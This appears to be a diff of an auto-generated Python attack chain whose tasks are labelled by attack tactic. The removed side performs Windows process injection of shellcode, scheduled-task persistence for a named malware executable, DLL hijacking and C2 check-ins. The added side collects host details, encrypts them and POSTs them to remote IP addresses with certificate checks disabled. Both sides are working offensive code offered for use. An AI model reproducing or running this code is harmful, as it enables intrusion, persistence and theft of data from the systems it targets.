@@ -1,175 +1,108 @@
 #!/usr/bin/env python3
-import sys, json, time, ctypes, psutil, subprocess, os, shutil, requests, ssl
-from ctypes import wintypes
+import sys, json, time, ssl, requests
+import platform
 from typing import Dict, Any
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import os
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    
-    PROCESS_ALL_ACCESS = 0x1F0FFF
-    shellcode = bytes.fromhex("fc4883e4f0")  # NOP sled as placeholder shellcode
-
     try:
-        # Step 1: Find target process
-        target_pid = None
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'].lower() in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
-                target_pid = proc.info['pid']
-                break
+        # Gather system information
+        os_version = platform.version()
+        architecture = platform.machine()
+        hostname = platform.node()
 
-        injection_success = True
-        if target_pid is None:
-            # Fallback to self-injection
-            target_pid = ctypes.windll.kernel32.GetCurrentProcess()
-            injection_success = False
-
-        # Step 2: Open process
-        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
-        if not process_handle:
-            raise Exception("Failed to open process")
-
-        # Step 3: Allocate memory in the target process
-        remote_addr = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x3000, 0x40)
-        if not remote_addr:
-            raise Exception("Failed to allocate memory in target process")
-
-        # Step 4: Write shellcode to allocated memory
-        bytes_written = ctypes.c_size_t(0)
-        if not ctypes.windll.kernel32.WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(bytes_written)):
-            raise Exception("Failed to write shellcode to target process memory")
-
-        # Step 5: Create remote thread to execute shellcode
-        thread_id = ctypes.c_ulong(0)
-        if not ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)):
-            raise Exception("Failed to create remote thread in target process")
-
-        # Close the process handle
-        ctypes.windll.kernel32.CloseHandle(process_handle)
-
+        # Prepare the result dictionary
         result = {
-            'remote_addr': remote_addr,
-            'success': injection_success
+            'os_version': os_version,
+            'architecture': architecture,
+            'hostname': hostname
         }
+
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
+        # Return partial data with None for any missing fields
         result = {
-            'remote_addr': None,
-            'success': False
+            'os_version': None,
+            'architecture': None,
+            'hostname': None
         }
         return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}
+                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
+
+def encrypt_data(data: str, key: bytes, iv: bytes) -> bytes:
+    """Encrypt the given data using AES encryption."""
+    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    return encryptor.update(data.encode()) + encryptor.finalize()
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    task_created = False
     try:
-        # Define the task name and the path to the malware executable
-        task_name = "MalwarePersistenceTask"
-        malware_path = "C:\\Path\\To\\Malware.exe"
+        # Collect OS information
+        os_version = input_data.get('os_version', '')
+        architecture = input_data.get('architecture', '')
+        hostname = input_data.get('hostname', '')
 
-        # Create the scheduled task using schtasks
-        result = subprocess.run(
-            ['schtasks', '/create', '/tn', task_name, '/tr', malware_path, '/sc', 'onlogon', '/f'],
-            capture_output=True, text=True
-        )
+        # Concatenate the OS information into a single string
+        os_info = f"OS Version: {os_version}, Architecture: {architecture}, Hostname: {hostname}"
 
-        # Check if the task was created successfully
-        if result.returncode == 0:
-            task_created = True
-        else:
-            # Log the failure (for debugging purposes, not returned in output)
-            print(f"Failed to create task: {result.stderr}")
+        # Generate a random key and IV for AES encryption
+        key = os.urandom(32)  # AES-256
+        iv = os.urandom(16)   # AES block size for CFB mode
 
-        return {'success': True, 'data': {'task_created': task_created},
+        # Encrypt the OS information
+        encrypted_data = encrypt_data(os_info, key, iv)
+
+        # Return the encrypted data as a hex string
+        result = {'encrypted_data': encrypted_data.hex()}
+        
+        return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'task_created': task_created},
+        return {'success': False, 'data': {'encrypted_data': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    dll_name = "malicious.dll"
-    source_path = os.path.join(os.getcwd(), dll_name)
-    target_dir = "C:\\Users\\Public\\"
-    target_path = os.path.join(target_dir, dll_name)
-    
     try:
-        # Attempt to copy the malicious DLL to the target directory
-        shutil.copy(source_path, target_path)
-        dll_loaded = os.path.exists(target_path)
-        
-        result = {'dll_loaded': dll_loaded}
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
-    except Exception as e:
-        # If copying fails, log the error and return dll_loaded as False
-        result = {'dll_loaded': False}
-        return {'success': False, 'data': result,
-                'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+        # Extract encrypted data from input
+        encrypted_data = bytes.fromhex(input_data.get('encrypted_data', ''))
 
-def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    start = time.time()
-    input_data = input_data or {}
-    try:
-        # Attempt to retrieve the username using environment variables
-        username = os.getenv('USERNAME') or os.getenv('USER')
-        
-        # If environment variables fail, try using pywin32 if available
-        if not username:
-            try:
-                import win32api
-                username = win32api.GetUserName()
-            except ImportError:
-                username = None
-        
-        # Prepare the result dictionary
-        result = {
-            'username': username
-        }
-        
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
-    except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
+        # Define the remote server URL
+        server_url = "https://192.168.62.159/api"
 
-def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    start = time.time()
-    input_data = input_data or {}
-    result = {'connected': False}
-    
-    try:
-        # Define the C2 server URL
-        c2_url = "https://192.168.83.117/api"
-
-        # Create an SSL context for HTTPS communication
+        # Create SSL context for secure transmission
         context = ssl.create_default_context()
-        
-        # Attempt to connect to the C2 server using HTTPS
-        try:
-            response = requests.get(c2_url, timeout=5, verify=False)
-            if response.status_code == 200:
-                result['connected'] = True
-        except requests.exceptions.SSLError:
-            # Fallback to HTTP if TLS fails
-            try:
-                response = requests.get(c2_url.replace("https://", "http://"), timeout=5)
-                if response.status_code == 200:
-                    result['connected'] = True
-            except Exception as e:
-                pass  # Log warning in a real scenario
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
 
+        # Attempt to send data over HTTPS
+        try:
+            response = requests.post(server_url, data=encrypted_data, timeout=10, verify=False)
+            response.raise_for_status()
+            success = True
+        except requests.exceptions.RequestException as e:
+            # Log warning and fallback to HTTP if HTTPS fails
+            print(f"Warning: HTTPS failed, falling back to HTTP. Error: {e}")
+            server_url = "https://192.168.178.88/api"
+            response = requests.post(server_url, data=encrypted_data, timeout=10)
+            response.raise_for_status()
+            success = True
+
+        result = {'success': success}
         return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def main() -> dict:
     """Auto-generated orchestrator — do not edit by hand."""
@@ -177,89 +110,57 @@ def main() -> dict:
     results: dict = {}
     failed:  list = []
     
-    # ── T1: Inject shellcode into a running process [execution] ──
+    # ── T1: Collect OS Information [discovery] ──
     try:
         r = task_T1(None)
         results['T1'] = r
         if r.get('success'):
             outputs['T1'] = r.get('data', {})
-            print(f'[+] T1 (Inject shellcode into a running process): OK')
+            print(f'[+] T1 (Collect OS Information): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T1 (Inject shellcode into a running process): FAILED — {err}')
+            print(f'[-] T1 (Collect OS Information): FAILED — {err}')
             failed.append('T1')
     except Exception as e:
         print(f'[!] T1 crashed: {e}')
         failed.append('T1')
         results['T1'] = {'success': False, 'error': str(e)}
     
-    # ── T2: Establish persistence with a scheduled task [persistence] ──
+    # ── T2: Encrypt OS Information [defense-evasion] ──
     try:
-        r = task_T2(None)
+        r = task_T2(outputs.get('T1', {}))
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Establish persistence with a scheduled task): OK')
+            print(f'[+] T2 (Encrypt OS Information): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Establish persistence with a scheduled task): FAILED — {err}')
+            print(f'[-] T2 (Encrypt OS Information): FAILED — {err}')
             failed.append('T2')
     except Exception as e:
         print(f'[!] T2 crashed: {e}')
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
     
-    # ── T3: Load malicious code through DLL hijacking [persistence] ──
+    # ── T3: Send Encrypted Data to Remote Server [exfiltration] ──
     try:
-        r = task_T3(None)
+        r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Load malicious code through DLL hijacking): OK')
+            print(f'[+] T3 (Send Encrypted Data to Remote Server): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Load malicious code through DLL hijacking): FAILED — {err}')
+            print(f'[-] T3 (Send Encrypted Data to Remote Server): FAILED — {err}')
             failed.append('T3')
+            r2 = task_T3(outputs.get('T2', {}))
+            if r2.get('success'):
+                outputs['T3'] = r2.get('data', {})
+                failed.remove('T3')
     except Exception as e:
         print(f'[!] T3 crashed: {e}')
         failed.append('T3')
         results['T3'] = {'success': False, 'error': str(e)}
-    
-    # ── T4: Identify the current user [discovery] ──
-    try:
-        r = task_T4(None)
-        results['T4'] = r
-        if r.get('success'):
-            outputs['T4'] = r.get('data', {})
-            print(f'[+] T4 (Identify the current user): OK')
-        else:
-            err = r.get('error', 'unknown')
-            print(f'[-] T4 (Identify the current user): FAILED — {err}')
-            failed.append('T4')
-    except Exception as e:
-        print(f'[!] T4 crashed: {e}')
-        failed.append('T4')
-        results['T4'] = {'success': False, 'error': str(e)}
-    
-    # ── T5: Communicate with a C2 server over HTTPS [c2-setup] ──
-    try:
-        r = task_T5(None)
-        results['T5'] = r
-        if r.get('success'):
-            outputs['T5'] = r.get('data', {})
-            print(f'[+] T5 (Communicate with a C2 server over HTTPS): OK')
-        else:
-            err = r.get('error', 'unknown')
-            print(f'[-] T5 (Communicate with a C2 server over HTTPS): FAILED — {err}')
-            failed.append('T5')
-            r2 = task_T5(None)
-            if r2.get('success'):
-                outputs['T5'] = r2.get('data', {})
-                failed.remove('T5')
-    except Exception as e:
-        print(f'[!] T5 crashed: {e}')
-        failed.append('T5')
-        results['T5'] = {'success': False, 'error': str(e)}
     
     success = len(failed) == 0
     if success:
